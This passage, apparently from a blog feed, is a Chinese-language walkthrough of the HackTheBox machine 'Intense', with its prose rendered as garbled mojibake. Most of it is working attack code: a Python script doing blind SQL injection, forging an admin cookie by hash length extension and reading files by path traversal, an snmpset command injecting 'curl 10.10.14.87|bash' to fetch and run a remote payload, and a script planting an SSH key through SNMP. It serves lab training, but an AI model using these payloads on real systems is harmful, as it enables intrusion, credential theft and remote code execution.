flag</code></pre><p>å¾—åˆ°hash<br><code>f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105</code></p><p>æ‹¿åˆ°hashåå°è¯•è§£æ—¶æœç„¶æ²¡æœ‰å¾—åˆ°æ˜æ–‡ã€‚çœ‹æ¥å¦æœ‰ç„æœºã€‚æ³¨æ„åˆ° lwt.pyä¸­ä¸€ä¸ªå¾ˆæ˜¾çœ¼çš„éƒ¨åˆ†</p><pre><code class="python">SECRET = os.urandom(randrange(8, 15))def sign(msg):    &quot;&quot;&quot; Sign message with secret key &quot;&quot;&quot;    return sha256(SECRET + msg).digest()</code></pre><p>è¿™é‡Œä½œä¸ºç›å€¼çš„SECRETå¤„äºhashç®—æ³•sha256çš„å‰ç«¯ã€‚è¿™è¯´æ˜æ˜¯å­˜åœ¨hashæ‰©å±•æ”»å‡»çš„ã€‚æˆ‘ä»¬ä»”ç»†çœ‹ä¸‹å…¶è°ƒç”¨ä½ç½®ã€‚</p><pre><code class="python">def parse_session(cookie):    &quot;&quot;&quot; Parse cookie and return dict        @cookie: &quot;key1=value1;key2=value2&quot;        return {&quot;key1&quot;:&quot;value1&quot;,&quot;key2&quot;:&quot;value2&quot;}    &quot;&quot;&quot;    b64_data, b64_sig = cookie.split(&#39;.&#39;)    data = b64decode(b64_data)    sig = b64decode(b64_sig)    if not verif_signature(data, sig):        raise InvalidSignature    info = {}    for group in data.split(b&#39;;&#39;):        try:            if not group:                continue            key, val = group.split(b&#39;=&#39;)            info[key.decode()] = val        except Exception:            continue    return info    </code></pre><p>è¿™é‡Œå¯ä»¥å‘ç°ã€‚å®ƒå–cookieä¸­ç”±<code>.</code>åˆ†å‰²å¼€çš„ä¸¤éƒ¨åˆ†åˆ†åˆ«ä½œä¸ºdataä¸sign.å…¶ä¸­dataæ˜¯<code>username=guest;secret=SHA256{guest}</code>çš„base64æ•°æ®ã€‚ä»è¿™é‡Œçš„å–é”®å€¼è¿”å›infoçš„å‡½æ•°å¾ˆå¿«å°±èƒ½å‘ç°å­˜åœ¨å˜é‡è¦†ç›–ã€‚æ¯”å¦‚æˆ‘ä»¬åœ¨åŸå§‹æ•°æ®åæ·»åŠ <code>username=admin;secret=xxx</code>å°±èƒ½è¦†ç›–åŸå…ˆcookieä¸­usernameä¸secretçš„å€¼ã€‚è€Œè¿™æ­£æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»èƒ½åšåˆ°çš„ï¼šåœ¨åŸæœ‰æ•°æ®ä¸Šæ·»åŠ æ–°çš„æ•°æ®ã€‚</p><p>é‚£ä¹ˆå›è¿‡å¤´æ¥çœ‹ä¸‹å®ƒæ˜¯å¦‚ä½•åˆ¤æ–­adminçš„ã€‚å‘ç°æœç„¶æ˜¯ä»cookieä¸­å–adminä¸secretä¸æ•°æ®åº“ä¸­çš„usernameä¸secretè¿›è¡Œæ¯”è¾ƒã€‚è¿”å›å…¶roleå€¼ã€‚ä¸º1å³admin.</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»äº†,ç”±äºSECRETé•¿åº¦æœ‰èŒƒå›´,æ‰€ä»¥éœ€è¦å°èŒƒå›´å°è¯•ä¸€ä¸‹ã€‚å¹¶ä¸”ä½¿ç”¨hashpumpyæ·»åŠ æ•°æ®<code>;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;</code>ä¹‹æ‰€ä»¥è¿˜è¦åŠ ä¸ªåˆ†å·æ˜¯å› ä¸ºæˆ‘ä»¬çš„é•¿åº¦æ‰©å±•æ”»å‡»ä¼šåœ¨åŸå§‹æ•°æ®åæ·»åŠ <code>\x00</code>ä¹‹ç±»çš„æ•°æ®ã€‚è€Œ<code>parse_session</code>å‡½æ•°æ˜¯æŒ‰åˆ†å·è¯†åˆ«é”®,å€¼çš„ã€‚éœ€è¦å¦åŠ ä¸€ä¸ªåˆ†å·é¿å…åé¢çš„usernameé”®åå¸¦ä¸Šå‰é¢çš„æ•°æ®ã€‚</p><p>å› ä¸ºè¦åšåˆ°åˆ—ç›®å½•ï¼Œè¯»æ–‡ä»¶ï¼Œè‚¯å®šå¾—é‡å¤è°ƒç”¨ã€‚äºæ˜¯æ‰“ç®—å°è¯•ä¸‹å†™å®Œæ•´çš„åˆ©ç”¨è„šæœ¬æ¥æ¨¡æ‹Ÿå‘½ä»¤è¡Œæ¨¡å¼,æ€»å½’æ˜¯å†™å‡ºæ¥äº†ã€‚è™½ç„¶æˆ‘è§‰å¾—æ•ˆæœä¸€èˆ¬èˆ¬,ä½†æ¯•ç«Ÿæ˜¯ç¬¬ä¸€æ¬¡å†™æ¯”è¾ƒå®Œæ•´çš„åˆ©ç”¨,å¿ƒé‡Œè¿˜æ˜¯æ¯”è¾ƒèˆ’é€‚çš„233.</p><p>å› ä¸ºsqlæ³¨å…¥éƒ¨åˆ†æœ¬åœ°åªè¦10sä¸åˆ°ã€‚è¿œç¨‹è¦10åˆ†é’Ÿå¤šã€‚æ‰€ä»¥ç‰¹æ„åŠ äº†defaulté€‰é¡¹å¯ä»¥ç›´æ¥ä½¿ç”¨ç°æˆçš„ç”¨æˆ·åè·Ÿhash.</p><pre><code class="bash">python3 exp.py default</code></pre><pre><code class="python">#!/usr/bin/python3import requestsimport stringfrom hashpumpy import hashpumpfrom base64 import b64decode, b64encodefrom cmd import Cmdimport sysimport warningswarnings.filterwarnings(&#39;ignore&#39;)URL=&#39;http://10.10.10.195/&#39;guest_cred=&quot;&quot;admin_cookie={}class terminal(Cmd):    #prompt = &quot;[*] =&gt; &quot;    prompt=&#39;\033[1;31;40m[*]\033[0m&#39;+&#39; =&gt; &#39;+&#39;\033[0;34;40m /var/www/html/app&gt; \033[0m&#39;    print(&quot;[*] prompting a shell(current directory /var/www/html/app)&quot;)    def default(self, line):        command=line.split(&#39; &#39;)        try:            print(admin_command(command[0],command[1]))        except:            passdef get_admin_name():    print(&quot;[*] getting admin username:&quot;)    flag = &quot;&quot;    for i in range(1, 10):        a=0        for j in string.printable:            print(&quot;\r&quot; + flag, flush=False, end=&#39;&#39;)            payload = &quot;a&#39;) union select abs(case when (substr((select username from users limit 0,1),&quot; + str(i) + &quot;,1)=&#39;&quot; + j + &quot;&#39;) then(-9223372036854775808) else 0 end )--&quot;            data = {&#39;message&#39;: payload}            r = requests.post(URL + &#39;submitmessage&#39;, data=data)            if &#39;overflow&#39; in r.text:                a=1                flag += j                print(&quot;\r&quot; + flag, flush=True, end=&#39;&#39;)                break        if a==0:            break    print(&quot;\r&quot;)    return flagdef get_admin_hash():    print(&quot;[*] getting admin hash:&quot;+&quot;\r&quot;)    flag = &quot;&quot;    for i in range(1, 64 + 1):        a=0        for j in string.printable:            print(&quot;\r&quot; + flag, flush=False, end=&#39;&#39;)            payload = &quot;a&#39;) union select abs(case when (substr((select secret from users limit 0,1),&quot; + str(i) + &quot;,1)=&#39;&quot; + j + &quot;&#39;) then(-9223372036854775808) else 0 end )--&quot;            data = {&#39;message&#39;: payload}            r = requests.post(URL + &#39;submitmessage&#39;, data=data)            if &#39;overflow&#39; in r.text:                a=1                flag += j                print(&quot;\r&quot; + flag, flush=True, end=&#39;&#39;)                break        if a==0:            break    print(&quot;\r&quot;)    return flagdef guest_login():    print(&quot;[*] login with guest:guest&quot;+&quot;\r&quot;)    global guest_cred    users={&#39;username&#39;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;}    r=requests.post(URL+&#39;postlogin&#39;,data=users)    old_data,old_sig=r.cookies[&#39;auth&#39;].split(&#39;.&#39;)    guest_cred=b64decode(old_data).decode()    return b64decode(old_sig).hex()def crafting_payload():    if DEFAULT!=True:                  #from scratch        admin_name=get_admin_name()        admin_hash=get_admin_hash()    else:        #default        admin_name=&quot;admin&quot;        admin_hash=&quot;f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105&quot;    old_sig = guest_login()    old_data=guest_cred    payload=&#39;;&#39;+(&quot;;&quot;.join([&quot;username=&quot;+admin_name,&quot;secret=&quot;+admin_hash]))+&quot;;&quot;    new_sig=&quot;&quot;    for length in range(8,15):        res = hashpump(old_sig, old_data, payload,length)        cookie=(b64encode(res[1])+b&#39;.&#39;+b64encode(bytes.fromhex(res[0]))).decode()        if admin_login(cookie):            print(&#39;[*] testing length &#39;+str(length)+&quot; : &quot;)            print(&#39;[*] admin_cookie: &#39;+ cookie)            return cookie    return &quot;[*] Failes getting proper cookie.&quot;def admin_login(cookie):    cookies={&quot;auth&quot;:cookie}    r=requests.get(URL+&#39;admin&#39;,cookies=cookies)    if r.status_code==403:        return False    else:        return Truedef admin_command(option,command):    if option not in [&#39;dir&#39;,&#39;view&#39;]:        return &quot;Only dir/view supported.&quot;    elif option==&#39;dir&#39;:        r=requests.post(URL+&#39;admin/log/dir&#39;,data={&#39;logdir&#39;:command},cookies=admin_cookie)        return r.text    else:        r = requests.post(URL + &#39;admin/log/view&#39;, data={&#39;logfile&#39;: &#39;../&#39;+command},cookies=admin_cookie)        return r.textif __name__==&#39;__main__&#39;:    if len(sys.argv)==2:        if sys.argv[1]==&#39;default&#39;:            print(&quot;[*] use default username + password&quot;)            DEFAULT=True        else:            exit(&quot;[*] specify default flag&quot;)    else:        DEFAULT=False    admin_cookie[&#39;auth&#39;]=crafting_payload()    terminal().cmdloop()</code></pre><p>æ•ˆæœå¦‚å›¾:<br><img src="/2020/07/22/hackthebox-Intense/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¤§è‡´åŠŸèƒ½:è·‘èµ·æ¥å°±èƒ½å¾—åˆ°adminè·Ÿhash;çˆ†ç ´å‡ºadminçš„cookie;æ”¯æŒå‡å‘½ä»¤è¡Œ<code>dir</code>è·Ÿ<code>view</code>å‘½ä»¤åˆ†åˆ«ç”¨æ¥åˆ—ç›®å½•è·Ÿè¯»æ–‡ä»¶ã€‚</p><p>è¿™æ ·å°±èƒ½å¾ˆå¿«åœ¨<code>/home/user</code>ä¸‹æ‰¾åˆ°user.txtè¯»å–äº†ã€‚</p><p>å°ç»“ä¸‹ã€‚è¿™ä¸€éƒ¨åˆ†æˆ‘è§‰å¾—éš¾åº¦ä¸€èˆ¬ã€‚æ‹¿åˆ°CTFä¸­å€’æ˜¯æŒºåˆé€‚çš„ã€‚ä¸è¿‡æˆ‘è§‰å¾—è¿™ä¸ªhashé•¿åº¦æ‰©å±•ä»¥åŠå‰é¢æ³¨å…¥æ—¶è¸©çš„ä¸èƒ½ç”¨å®Œæ•´çš„<code>abs()</code>çš„å‘ç®—æ˜¯ç»™è‡ªå·±ä¸€äº›æé†’ã€‚</p><h2 id="privesc-to-shell"><a href="#privesc-to-shell" class="headerlink" title="privesc to shell"></a>privesc to shell</h2><p>  æ¥ä¸‹æ¥è¿™ä¸€éƒ¨åˆ†æœ‰ç‚¹ç„å¦™ã€‚æ˜¾ç„¶æˆ‘ä»¬ç°åœ¨å·²ç»èƒ½è¯»æ–‡ä»¶è·Ÿåˆ—ç›®å½•äº†ã€‚ä½†æ˜¯å´æ²¡æœ‰ä¸€ä¸ªshell.è€Œåœ¨userçš„ç›®å½•ä¸‹ç›´æ¥ç»™äº†ä¸€ä¸ªcçš„æºç æç¤ºæˆ‘ä»¬</p><pre><code class="c">// gcc -Wall -pie -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro note_server.c -o note_server#include &lt;signal.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#define BUFFER_SIZE 1024void handle_client(int sock) {    char note[BUFFER_SIZE];    uint16_t index = 0;    uint8_t cmd;    // copy var    uint8_t buf_size;    uint16_t offset;    uint8_t copy_size;    while (1) {        // get command ID        if (read(sock, &amp;cmd, 1) != 1) {            exit(1);        }        switch(cmd) {            // write note            case 1:                if (read(sock, &amp;buf_size, 1) != 1) {                    exit(1);                }                // prevent user to write over the buffer                if (index + buf_size &gt; BUFFER_SIZE) {                    exit(1);                }                // write note                if (read(sock, &amp;note[index], buf_size) != buf_size) {                    exit(1);                }                index += buf_size;            break;            // copy part of note to the end of the note            case 2:                // get offset from user want to copy                if (read(sock, &amp;offset, 2) != 2) {                    exit(1);                }                // sanity check: offset must be &gt; 0 and &lt; index                if (offset &lt; 0 || offset &gt; index) {                    exit(1);                }                // get the size of the buffer we want to copy                if (read(sock, &amp;copy_size, 1) != 1) {                    exit(1);                }                // prevent user to write over the buffer&#39;s note                if (index &gt; BUFFER_SIZE) {                    exit(1);                }                // copy part of the buffer to the end                 memcpy(&amp;note[index], &amp;note[offset], copy_size);                index += copy_size;            break;            // show note            case 3:                write(sock, note, index);            return;        }    }}int main( int argc, char *argv[] ) {    int sockfd, newsockfd, portno;    unsigned int clilen;    struct sockaddr_in serv_addr, cli_addr;    int pid;    /* ignore SIGCHLD, prevent zombies */    struct sigaction sigchld_action = {        .sa_handler = SIG_DFL,        .sa_flags = SA_NOCLDWAIT    };    sigaction(SIGCHLD, &amp;sigchld_action, NULL);    /* First call to socket() function */    sockfd = socket(AF_INET, SOCK_STREAM, 0);    if (sockfd &lt; 0) {        perror(&quot;ERROR opening socket&quot;);        exit(1);    }    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;(int){ 1 }, sizeof(int)) &lt; 0)        perror(&quot;setsockopt(SO_REUSEADDR) failed&quot;);    /* Initialize socket structure */     bzero((char *) &amp;serv_addr, sizeof(serv_addr));    portno = 5001;    serv_addr.sin_family = AF_INET;    serv_addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);    serv_addr.sin_port = htons(portno);    /* Now bind the host address using bind() call.*/    if (bind(sockfd, (struct sockaddr *) &amp;serv_addr, sizeof(serv_addr)) &lt; 0) {        perror(&quot;ERROR on binding&quot;);        exit(1);    }    listen(sockfd,5);    clilen = sizeof(cli_addr);    while (1) {        newsockfd = accept(sockfd, (struct sockaddr *) &amp;cli_addr, &amp;clilen);        if (newsockfd &lt; 0) {            perror(&quot;ERROR on accept&quot;);            exit(1);        }        /* Create child process */        pid = fork();        if (pid &lt; 0) {            perror(&quot;ERROR on fork&quot;);            exit(1);        }        if (pid == 0) {            /* This is the client process */            close(sockfd);            handle_client(newsockfd);            exit(0);        }        else {            close(newsockfd);        }    } /* end of while */}</code></pre><p>è¿™ä¸‹æˆ‘æ˜¯çœŸæ‡µäº†ã€‚å› ä¸ºçœ‹èµ·æ¥å°±æ˜¯ä¸ªpwné¢˜ã€‚ä½†æ¯”pwnæ›´é‡è¦çš„æ˜¯,æºç ä¸­å¯ä»¥çœ‹å‡ºæ¥å®ƒè·‘åœ¨127.0.0.1 5001ä¸Šã€‚é‚£ä¹ˆæˆ‘ä»¬å¤–ç½‘æ˜¯è®¿é—®ä¸åˆ°çš„ã€‚è¿™é‡Œä¼¼ä¹éœ€è¦ä¸€ä¸ªshellæ¥è®¿é—®ã€‚</p><p>äºæ˜¯ç»§ç»­è¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚é¦–å…ˆè¯»äº†ä¸‹<code>/proc/net/tcp</code></p><pre><code class="bash">/proc/net/tcpsl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                        0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 27909 1 0000000000000000 100 0 0 10 0                        1: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 24101 1 0000000000000000 100 0 0 10 0                        2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 28936 1 0000000000000000 100 0 0 10 0                        3: 0100007F:1389 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 25962 1 0000000000000000 100 0 0 10 0                        4: C30A0A0A:0050 570E0A0A:B5EE 01 00000000:00000000 00:00000000 00000000    33        0 328478 1 0000000000000000 138 4 30 10 7              </code></pre><p>è¿™é‡Œ1389å¯¹åº”çš„æ˜¯5001çš„16è¿›åˆ¶ã€‚å¹¶ä¸”å…¶uidæ˜¯0ã€‚è¿™è¯´æ˜æ˜¯rootè¿è¡Œ,æ­£å¥½ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ã€‚</p><p>æ¥ç€çªç„¶å‘ç°ä¸€ä¸ª/etc/snmp/snmpd.conf</p><pre><code>agentAddress  udp:161view   systemonly  included   .1.3.6.1.2.1.1view   systemonly  included   .1.3.6.1.2.1.25.1 rocommunity public  default    -V systemonly rwcommunity SuP3RPrivCom90#################################################################################  SYSTEM INFORMATION##  Note that setting these values here, results in the corresponding MIB objects being &#39;read-only&#39;#  See snmpd.conf(5) for more detailssysLocation    Sitting on the Dock of the BaysysContact     Me &lt;user@intense.htb&gt;                                                 # Application + End-to-End layerssysServices    72##  Process Monitoring#                               # At least one  &#39;mountd&#39; processproc  mountd                               # No more than 4 &#39;ntalkd&#39; processes - 0 is OKproc  ntalkd    4                               # At least one &#39;sendmail&#39; process, but no more than 10proc  sendmail 10 1##  Disk Monitoring#                               # 10MBs required on root disk, 5% free on /var, 10% free on all other disksdisk       /     10000disk       /var  5%includeAllDisks  10%##  System Load#                               # Unacceptable 1-, 5-, and 15-minute load averagesload   12 10 5#################################################################################  ACTIVE MONITORING#                                    #   send SNMPv1  traps trapsink     localhost public##  Event MIB - automatically generate alerts#                                   # Remember to activate the &#39;createUser&#39; lines aboveiquerySecName   internalUserrouser          internalUser                                   # generate traps on UCD error conditionsdefaultMonitors          yes                                   # generate traps on linkUp/DownlinkUpDownNotifications  yes##  Arbitrary extension commands# extend    test1   /bin/echo  Hello, world! extend-sh test2   echo Hello, world! ; echo Hi there ; exit 35 master          agentx</code></pre><p>çœ‹åˆ°è¿™ä¸ªudpæˆ‘å°±ä¼°è®¡ä¸å¦™ï¼Œè‡ªå·±æ¢æµ‹ç«¯å£æ—¶è‚¯å®šåˆå¿˜è®°æ‰«udpäº†ã€‚è€Œä¸”ä»è¿™ä¸ªsnmp.confä¸­å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå…³é”®ç»„<code>SuP3RPrivCom90</code>å±äº<code>rwcommunity</code>æœ‰ç€è¯»å†™æƒé™ã€‚äºæ˜¯æˆ‘å»æœç´¢äº†ä¸‹snmpç›¸å…³æ¼æ´,å‘ç°çœŸçš„å¯ä»¥è¾¾æˆgetshell</p><p>å…ˆnmapæ‰«ä¸‹ç¡®è®¤</p><pre><code class="bash"># Nmap 7.80 scan initiated Sun Jul 19 11:05:42 2020 as: nmap -sU -sC -oA nmap/intense-udp 10.10.10.195Nmap scan report for 10.10.10.195Host is up (0.43s latency).Not shown: 999 closed portsPORT    STATE SERVICE161/udp open  snmp| snmp-info: |   enterprise: net-snmp|   engineIDFormat: unknown|   engineIDData: f20383648c26d05d00000000|   snmpEngineBoots: 603|_  snmpEngineTime: 10h34m03s| snmp-sysdescr: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64|_  System uptime: 10h34m3.40s (3804340 timeticks)# Nmap done at Sun Jul 19 11:26:16 2020 -- 1 IP address (1 host up) scanned in 1234.34 seconds</code></pre><p>æœç„¶é…ç½®ä¸æ˜¯localhost:161çš„è¯æˆ‘ä»¬æ˜¯å¯ä»¥å¤–ç½‘ç›´æ¥è®¿é—®çš„ã€‚æ¥ä¸‹æ¥å°±æ˜¯æ ¹æ®ç½‘ä¸Šçš„æ–‡ç« è¿›è¡Œäº†è§£äº†ã€‚<br><a href="https://digi.ninja/blog/snmp_to_shell.php" target="_blank" rel="noopener">https://digi.ninja/blog/snmp_to_shell.php</a><br> éœ€è¦æ³¨æ„çš„æ˜¯ã€‚è¦æ˜¯å‡ºç°äº†è·Ÿæ–‡ç« ä¸­ä¸€å¼€å§‹ä¸€æ ·çš„æŠ¥é”™,éœ€è¦æŒ‰ç…§è¿™ç¯‡ <a href="https://docs.linuxconsulting.mn.it/notes/net-snmp-errors" target="_blank" rel="noopener">æ–‡ç« </a>è¿›è¡Œç›¸å…³ä¸‹è½½ã€‚æˆ‘çš„kalié»˜è®¤ä¹Ÿæ˜¯ä¼šæŠ¥é”™çš„,éœ€è¦ä¸‹è½½é¢å¤–çš„ä¾èµ–å¹¶ä¿®æ”¹é…ç½®ã€‚</p><p> æˆåŠŸè¿è¡Œ<code>snmpwalk -v2c -c SuP3RPrivCom90  10.10.10.195  nsExtendOutput1</code>çš„è¯æ˜¯è¿™æ ·çš„<br><img src="/2020/07/22/hackthebox-Intense/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br> ä»æ–‡ç« ä¸­äº†è§£åˆ°,å¦‚æœç›´æ¥ä¿®æ”¹confæ–‡ä»¶,æ˜¯å¯ä»¥åˆ©ç”¨extend è¿™ä¸€éƒ¨åˆ†å¯æ‰§è¡Œå‘½ä»¤çš„ç‰¹ç‚¹æ¥è¿›è¡Œæ¶æ„å‘½ä»¤çš„æ’å…¥ã€‚é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨åœ¨è¿œç¨‹,è¿˜æœ‰æ–¹æ³•å¯ä»¥ç›´æ¥ä¿®æ”¹æˆ–è€…æ’å…¥åä»¤å—ï¼Ÿå½“ç„¶æ˜¯å¯ä»¥çš„ã€‚æˆ‘å¾ˆå¿«æ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« ã€‚<br> <a href="https://mogwailabs.de/blog/2019/10/abusing-linux-snmp-for-rce/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/10/abusing-linux-snmp-for-rce/</a></p><p>ç¨å¾®è°ƒç”¨ä¸‹nsExtendObjectsã€‚ä¼šå‘ç°å®ƒä¼šæŠŠextendé‡Œçš„å‘½ä»¤éƒ½æ‰§è¡Œä¸€å›ã€‚</p><pre><code class="bash">root@byc404:~# snmpwalk -v2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjectsNET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 6NET-SNMP-EXTEND-MIB::nsExtendCommand.&quot;test&quot; = STRING: /bin/bashNET-SNMP-EXTEND-MIB::nsExtendCommand.&quot;test1&quot; = STRING: /bin/echoNET-SNMP-EXTEND-MIB::nsExtendCommand.&quot;test2&quot; = STRING: echo</code></pre><p>è¿™é‡Œtestæœ¬æ¥ä¸åº”è¯¥å­˜åœ¨çš„ã€‚åº”è¯¥æ˜¯å…¶ä»–äººåˆ›å»ºäº†è¿™ä¸ªå˜é‡ã€‚è€Œå®ƒæ˜¯<code>/bin/.bash</code>è°ƒç”¨çš„ã€‚æ‰€ä»¥æˆ‘ç›´æ¥æ‹¿æ¥ä¿®æ”¹å€¼</p><pre><code class="bash">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195   &#39;nsExtendArgs.&quot;test&quot;&#39; = &#39;-c &quot;curl 10.10.14.87|bash&quot;&#39;snmpwalk -v2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects</code></pre><p><img src="/2020/07/22/hackthebox-Intense/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>getshell</p><p>è¿™é‡Œæˆ‘ç¬¬ä¸€æ¬¡è¯•æˆåŠŸäº†,åæ¥å› ä¸ºpwnä¸ä¼šå°±é€€å‡ºäº†ã€‚ç­‰ç¬¬äºŒå¤©å†å°è¯•åŒæ ·çš„æ–¹æ³•getshellå´å‘ç°æ€»æ˜¯è¿”å›timeoutã€‚æ¢äº†vpnåä¸è¿”å›timeoutå´æ‰§è¡Œä¸äº†curlå‘½ä»¤äº†â€¦â€¦æ€€ç–‘æ˜¯curlçš„timeoutæœ‰5så·¦å³è¾¾åˆ°äº†snmptimeoutçš„ä¸Šé™ï¼Œæ‰€ä»¥æ‰§è¡Œä¸äº†curl.äºæ˜¯æ¢äº†ä¸€ä¸ªæ€è·¯ã€‚æˆ‘ä»¬æ€»å½’æ˜¯è¦é€šè¿‡è®¿é—®é¶æœºçš„5001æ¥pwnåˆ°rootçš„ã€‚é‚£ç›´æ¥å†™sshå…¬é’¥ç„¶åç«¯å£è½¬å‘ä¹Ÿå¯ä»¥ã€‚</p><p>ç´¢æ€§å†™ä¸ªsh</p><pre><code class="bash">#!/bin/bashssh-keygen -f ./intense -q -N &quot;&quot;key=$(cat intense.pub)snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 \    &quot;nsExtendStatus.\&quot;test\&quot;&quot;  = createAndGo \    &quot;nsExtendCommand.\&quot;test\&quot;&quot; = /bin/bash \    &quot;nsExtendArgs.\&quot;test\&quot;&quot;    = &quot;-c \&quot;echo ${key} &gt;&gt; ~/.ssh/authorized_keys\&quot;&quot;snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjectsssh -N -L 5001:127.0.0.1:5001 Debian-snmp@10.10.10.195 -i intense</code></pre><p>è¿™æ ·æ•´ä½“æ‰§è¡Œèµ·æ¥ä¸ä¼šå› ä¸ºè¿ç»­çš„timeoutå¯¼è‡´æ‰‹æ•²å¤ªå¤šä»£ç ã€‚</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>å› ä¸ºä¸ä¼šæ‰€ä»¥æ‹œæ‰˜åˆ«äººäº†ã€‚ä¸€ä¸ªä¿æŠ¤å…¨å¼€çš„æ ˆæº¢å‡ºã€‚æ¶‰åŠåˆ°ä¸€äº›socketçŸ¥è¯†ã€‚å…·ä½“å°±å‚è€ƒjaubertçš„è®°å½•äº†</p><p><a href="https://jaubert.gitee.io/crackme/" target="_blank" rel="noopener">https://jaubert.gitee.io/crackme/</a></p><p>è¿œç¨‹æ‰“é€š<br><img src="/2020/07/22/hackthebox-Intense/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>æ•´ä½“ä¸Šå‰é¢æˆ‘è§‰å¾—ä¸ç®—éš¾ã€‚snmapç®—æ˜¯æ–°çŸ¥è¯†ã€‚æŒºæœ‰æ„æ€çš„ã€‚pwnçš„éƒ¨åˆ†ç›´æ¥è‡ªé—­ã€‚çœ‹æ¥ä»¥åä¹Ÿè¦å¼€å§‹å­¦ä¸‹cryè·Ÿpwnäº†â€¦â€¦</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RingZer0-CTF JavascriptChallenge</title>
      <link href="2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/"/>
      <url>2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/</url>
      
